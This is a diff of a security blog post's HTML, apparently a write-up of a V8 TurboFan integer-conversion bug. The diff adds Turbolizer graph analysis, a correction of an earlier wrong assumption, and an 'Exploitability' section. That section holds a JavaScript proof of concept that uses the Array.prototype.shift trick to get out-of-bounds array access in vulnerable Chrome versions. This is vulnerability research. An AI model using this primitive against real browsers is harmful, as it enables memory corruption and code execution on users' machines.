@@ -42,7 +42,8 @@ You can find the relevant chromium bug report here.
 &lt;p>Starting by just looking at the comment provided with the patch, the vulnerability appears to be a logic bug in &lt;code>GetWord32RepresentationFor&lt;/code>. There&amp;rsquo;s also mention of respecting the TypeCheckKind, though I&amp;rsquo;m not sure what this means just yet.&lt;/p>
 &lt;pre>&lt;code>[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor
 We have to respect the TypeCheckKind.
-&lt;/code>&lt;/pre>&lt;p>Looking at a diff of the patch itself, we can see that the bug occurs when converting a 64-bit integer to a 32-bit integer in the SimplifiedLowering phase. The author seems to have added only a single new check, ensuring that when the output type is Unsigned32, that the TypeCheckKind is kNone.&lt;/p>
+&lt;/code>&lt;/pre>&lt;p>Looking at a diff of the patch itself, we can see that the bug occurs when converting a 64-bit integer to a 32-bit integer in the SimplifiedLowering phase.&lt;/p>
+&lt;p>The author seems to have added only a single new check, ensuring that the TypeCheckKind is kNone when the output type is Unsigned32.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc
 index 64b274c..3d937ad 100644
 &lt;span style="color:#f92672">--- a/src/compiler/representation-change.cc
@@ -85,25 +86,46 @@ op &lt;span style="color:#f92672">=&lt;/span> machine()&lt;span style="color:#f9
 &lt;li>How can we leverage this signed/unsigned integer confusion to gain code execution?&lt;/li>
 &lt;/ol>
 &lt;h1 id="4-turbolizer-graph-comparison">4. Turbolizer Graph Comparison&lt;/h1>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>I&amp;rsquo;ve generated a Turbolizer graph for the PoC both prior to the patch, and after the patch was applied.&lt;/p>
+&lt;p>In this first Turbolizer graph (pre-patch), we can see that TurboFan assumes our input value has a range of (-1, 4294967295). This Float64 value is then converted to an Int64 for comparison, as the &lt;code>Math.max&lt;/code> call was lowered to an Int64LessThan node.&lt;/p>
+&lt;p>The result of this is then converted to a 32-bit signed integer via the TruncateInt64ToInt32 node.&lt;/p>
 &lt;figure class="left" >
 &lt;img src="https://anvbis.github.io/img/20221206/turbolizer-1.png" alt="turbolizer-1.png" />
 &lt;figcaption class="center" >Figure 1: Vulnerable turbolizer graph.&lt;/figcaption>
 &lt;/figure>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>The post-patch Turbolizer graph starts off very similarly to the pre-patch graph. However, rather than converting the output of &lt;code>Math.max&lt;/code> via a TruncateInt64ToInt32 node, we see a CheckedUint64ToInt32 node.&lt;/p>
+&lt;p>In this post-patch graph we can see that TurboFan has now correctly identified that the input was an unsigned value (that needed to be used in a signed operation), before converting it to a 32-bit integer.&lt;/p>
 &lt;figure class="left" >
 &lt;img src="https://anvbis.github.io/img/20221206/turbolizer-2.png" alt="turbolizer-2.png" />
 &lt;figcaption class="center" >Figure 2: Patched turbolizer graph.&lt;/figcaption>
 &lt;/figure>
+&lt;p>In our case, as &lt;code>use_info.type_check()&lt;/code> is kSigned32 rather than kNone, we fail the added check.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++"> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">if&lt;/span> (&lt;span style="color:#75715e">/* ... */&lt;/span>
 output_type.Is(Type&lt;span style="color:#f92672">::&lt;/span>Unsigned32()) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
 use_info.type_check() &lt;span style="color:#f92672">==&lt;/span> TypeCheckKind&lt;span style="color:#f92672">::&lt;/span>kNone &lt;span style="color:#75715e">/* ... */&lt;/span>) {
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>In our case, as &lt;code>use_info.type_check()&lt;/code> is kSigned32 rather than kNone, we fail the added check.&lt;/p>
-&lt;p>So instead, our input is passed on to the following code that checks whether the output is a kPositiveSafeInteger, which it is, before being converted to a &lt;code>CheckedUint64ToInt32&lt;/code> node, rather than a &lt;code>TruncateInt64ToInt32&lt;/code> node.&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Instead, our input is passed on to the following code that checks whether the output is a kPositiveSafeInteger, which it is, before being converted to a &lt;code>CheckedUint64ToInt32&lt;/code> node, rather than a &lt;code>TruncateInt64ToInt32&lt;/code> node.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++"> &lt;span style="color:#66d9ef">if&lt;/span> (output_type.Is(cache_&lt;span style="color:#f92672">-&amp;gt;&lt;/span>kPositiveSafeInteger)) {
 op &lt;span style="color:#f92672">=&lt;/span> simplified()&lt;span style="color:#f92672">-&amp;gt;&lt;/span>CheckedUint64ToInt32(use_info.feedback());
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="5-summary">5. Summary&lt;/h1>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="5-exploitability">5. Exploitability&lt;/h1>
+&lt;p>As this is bug was discovered prior to &lt;a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1198696">this patch&lt;/a>, we can use the &lt;code>Array.prototype.shift&lt;/code> trick to create an array with a length of &lt;code>-1&lt;/code>.&lt;/p>
+&lt;p>This gives us out-of-bounds read/write access below the array&amp;rsquo;s element store. In the code snippet below, I use this to corrupt another array&amp;rsquo;s length value, giving very stable out-of-bounds access.&lt;/p>
+&lt;p>From this point it&amp;rsquo;s a trivial exercise to build exploit primitives and gain code execution.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>) {
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>;
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">a&lt;/span>) &lt;span style="color:#a6e22e">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> Math.&lt;span style="color:#a6e22e">max&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">x&lt;/span>);
+&lt;span style="color:#a6e22e">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#a6e22e">z&lt;/span>;
+&lt;span style="color:#a6e22e">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> Math.&lt;span style="color:#a6e22e">sign&lt;/span>(&lt;span style="color:#a6e22e">z&lt;/span>);
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">cor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Array(&lt;span style="color:#a6e22e">z&lt;/span>);
+&lt;span style="color:#a6e22e">cor&lt;/span>.&lt;span style="color:#a6e22e">shift&lt;/span>();
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>, &lt;span style="color:#ae81ff">3.3&lt;/span>];
+&lt;span style="color:#66d9ef">return&lt;/span> { &lt;span style="color:#a6e22e">cor&lt;/span>, &lt;span style="color:#a6e22e">oob&lt;/span> };
+}
+&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">100000&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)
+&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">true&lt;/span>);
+&lt;span style="color:#66d9ef">let&lt;/span> { &lt;span style="color:#a6e22e">cor&lt;/span>, &lt;span style="color:#a6e22e">oob&lt;/span> } &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">false&lt;/span>);
+&lt;span style="color:#a6e22e">cor&lt;/span>[&lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I&amp;rsquo;ve written and attached an entire exploit for this CVE below.&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="1" type="checkbox" checked />
 &lt;label for="1">
@@ -227,7 +249,8 @@ DebugPrint: 0x19f90010bad9: [JSArrayBuffer]
 - byte_length: 1337
 - max_byte_length: 1337
 ...
-&lt;/code>&lt;/pre>&lt;p>Viewing these objects in memory, they&amp;rsquo;re almost identical except for one value stored 0x24 bytes from the start of the object, &lt;code>0x01000000&lt;/code> and &lt;code>0x01000010&lt;/code>. It wouldn&amp;rsquo;t be too crazy to think these must be the lookup values for the backing store.&lt;/p>
+&lt;/code>&lt;/pre>&lt;p>Viewing these objects in memory, they&amp;rsquo;re almost identical except for one value stored 0x24 bytes from the start of the object, &lt;code>0x01000000&lt;/code> and &lt;code>0x01000010&lt;/code>. &lt;del>It wouldn&amp;rsquo;t be too crazy to think these must be the lookup values for the backing store.&lt;/del>&lt;/p>
+&lt;p>&lt;strong>Edit:&lt;/strong> They&amp;rsquo;re not. I incorrectly assumed this when writing this post, but I&amp;rsquo;ll be leaving this up for posterity.&lt;/p>
 &lt;pre>&lt;code>pwndbg&amp;gt; x/12dwx 0x19f90010ba95-1
 0x19f90010ba94: 0x0024b945 0x00002259 0x00002259 0x000023e1
 0x19f90010baa4: 0x20000000 0x000000a7 0x20000000 0x000000a7
